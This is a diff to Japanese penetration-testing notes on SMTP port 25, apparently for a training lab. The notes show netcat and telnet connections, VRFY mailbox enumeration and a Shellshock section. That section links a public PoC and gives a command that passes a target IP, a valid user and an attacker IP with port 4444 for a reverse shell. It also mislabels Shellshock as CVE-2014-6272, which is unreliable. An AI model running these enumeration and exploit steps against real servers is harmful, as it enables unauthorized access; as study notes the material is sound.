@@ -13,7 +13,25 @@ VRFY idontexist
 550 5.1.1 <idontexist>: Recipient address rejected: User unknown in local recipient table
 ```
 
+```bash
+nc -nvC 10.11.1.72 25
+```
+
+-C：LFではなくCRLFでコマンド送信する
+
 ### telnet
+
+接続するとドメインが確認できる。
+
+![image-20230226122546227](img/SMTP(25)/image-20230226122546227.png)
+
+メールアドレスの正当性を確認できる(エラーがかえって来なければ成功）
+
+```
+VRFY useradm@mail.local
+```
+
+![image-20230226122636557](img/SMTP(25)/image-20230226122636557.png)
 
 以下入力情報
 
@@ -74,6 +92,20 @@ Connection closed by foreign host.
 ```
 
 https://qiita.com/awwa/items/dae1f8475c96b506edd0
+
+
+
+### Shellshock(CVE-2014-6272)
+
+procmail・formail
+
+PoCを成功させるには事前にVRFYで確認した正当なユーザである必要がある
+
+PoC：https://github.com/3mrgnc3/pentest_old/blob/master/postfix-shellshock-nc.py
+
+```
+python smtp.py 10.11.1.231 useradm@mail.local 192.168.45.190 4444 
+```
 
 
 
